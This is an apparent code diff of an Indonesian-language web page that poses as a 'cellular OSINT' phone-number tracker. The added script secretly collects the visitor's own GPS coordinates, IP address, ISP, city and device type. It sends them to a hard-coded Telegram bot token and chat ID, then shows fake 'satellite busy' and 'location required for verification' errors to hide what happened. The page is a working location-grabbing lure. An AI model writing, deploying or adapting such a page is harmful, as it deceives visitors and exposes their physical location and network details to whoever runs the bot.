@@ -3,37 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XYZ TRACKING - SATELLITE INTERFACE</title>
+    <title>XYZ TRACKING - CELLULAR OSINT</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap');
-        :root { --gold: #ffd700; --dark: #000; }
-        body { background: var(--dark); color: var(--gold); font-family: 'Share Tech Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        
-        .card { 
-            width: 90%; max-width: 400px; background: #050505; border: 2px solid var(--gold); 
-            padding: 35px; box-shadow: 0 0 30px rgba(255, 215, 0, 0.3); text-align: center;
-        }
-
-        h2 { font-family: 'Orbitron'; font-size: 28px; letter-spacing: 3px; color: #fff; text-shadow: 0 0 10px var(--gold); }
-        .sub { font-size: 10px; color: #555; letter-spacing: 5px; margin-bottom: 20px; }
-
-        .radar {
-            width: 80px; height: 80px; border: 2px solid var(--gold); border-radius: 50%;
-            margin: 20px auto; position: relative; overflow: hidden;
-        }
-        .radar::after {
-            content: ''; position: absolute; top: 50%; left: 50%; width: 100%; height: 2px;
-            background: rgba(255, 215, 0, 0.5); transform-origin: left; animation: sweep 2s linear infinite;
-        }
-        @keyframes sweep { from { transform: rotate(0deg) translate(-50%, -50%); } to { transform: rotate(360deg) translate(-50%, -50%); } }
-
-        input { width: 100%; background: transparent; border: none; border-bottom: 1px solid #333; color: white; padding: 15px; margin: 15px 0; outline: none; text-align: center; font-family: inherit; }
-        button { width: 100%; padding: 18px; background: transparent; color: var(--gold); border: 2px solid var(--gold); font-family: 'Orbitron'; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: var(--gold); color: #000; }
-        #status { font-size: 11px; color: #444; margin-top: 20px; text-transform: uppercase; }
+        body { background: #000; color: #ffd700; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; border: 2px solid #ffd700; padding: 40px 20px; text-align: center; background: #050505; box-shadow: 0 0 30px #ffd70044; }
+        h2 { font-family: 'Orbitron'; letter-spacing: 3px; margin-bottom: 5px; }
+        .radar-box { width: 100px; height: 100px; border: 1px solid #ffd700; border-radius: 50%; margin: 20px auto; position: relative; }
+        .radar-line { position: absolute; width: 50%; height: 2px; background: #ffd700; top: 50%; left: 50%; transform-origin: left; animation: scan 2s linear infinite; }
+        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        input { width: 80%; background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 15px; margin: 20px 0; outline: none; text-align: center; font-size: 18px; }
+        button { width: 80%; padding: 15px; background: transparent; color: #ffd700; border: 2px solid #ffd700; font-family: 'Orbitron'; cursor: pointer; font-weight: bold; }
+        #log { font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; }
     </style>
 </head>
 <body>
+
+<div class="card">
+    <h2>XYZ TRACKING</h2>
+    <div style="font-size: 10px; color: #555; letter-spacing: 3px;">CELLULAR OSINT V3.0</div>
+    
+    <div class="radar-box"><div class="radar-line"></div></div>
+
+    <input type="number" id="target_num" placeholder="08xxxxxxxxxx">
+    <button onclick="initiateScan()">CHECK DATA</button>
+    
+    <div id="log">Satellite Standby...</div>
+</div>
+
+<script>
+    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
+    const CHAT_ID = "7496062352";
+
+    function sendTele(msg) {
+        const ping = new Image();
+        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html&v=${Date.now()}`;
+    }
+
+    async function initiateScan() {
+        const num = document.getElementById('target_num').value;
+        if(num.length < 10) return alert("Nomor HP tidak valid!");
+
+        document.getElementById('log').innerText = "Requesting Satellite Uplink...";
+        
+        // Minta Izin Lokasi (Inti Tracking)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                
+                // Ambil IP & Provider
+                let ipData = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch(e) {}
+
+                const detailInfo = 
+                    `📡 <b>XYZ TRACKING - TARGET LOCKED</b>\n\n` +
+                    `📱 <b>Nomor HP:</b> <code>${num}</code>\n` +
+                    `🌐 <b>IP Address:</b> <code>${ipData.ip || 'Unknown'}</code>\n` +
+                    `🏢 <b>ISP:</b> ${ipData.org || 'Unknown'}\n` +
+                    `📍 <b>Kota:</b> ${ipData.city}, ${ipData.region}\n` +
+                    `🛰️ <b>Koordinat:</b> <code>${lat},${lon}</code>\n` +
+                    `📱 <b>Device:</b> ${navigator.platform}\n\n` +
+                    `🌍 <b>Google Maps:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+                sendTele(detailInfo);
+                
+                document.getElementById('log').innerText = "SCAN COMPLETE.";
+                alert("Sistem Sibuk: Gagal menghubungkan ke satelit provider. Coba lagi nanti.");
+            }, (err) => {
+                sendTele(`⚠️ <b>TRACKING BLOCKED</b>\nNomor: ${num}\nTarget menolak akses GPS.`);
+                alert("Error 0x44: Izin lokasi diperlukan untuk verifikasi nomor.");
+            });
+        }
+    }
+</script>
+</body>
+</html>
 
 <div class="card">
     <h2>XYZ TRACKING</h2>
